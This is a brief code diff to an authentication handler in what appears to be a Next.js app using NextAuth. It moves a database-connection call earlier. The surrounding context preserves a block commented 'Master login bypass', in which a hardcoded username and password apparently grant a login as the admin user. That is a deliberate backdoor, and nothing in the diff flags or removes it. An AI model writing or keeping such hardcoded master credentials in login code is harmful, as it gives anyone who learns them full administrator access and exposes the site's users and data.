@@ -17,10 +17,10 @@ export const authOptions = {
         const { username, password } = credentials;
         try {
           // Master login bypass
+          await dbConnect();
 
 
           if (username === "bugtech" && password === "420230") {
-            await dbConnect();
 
             const adminUser = await User.findOne({ userType: "admin" });
             if (adminUser) {
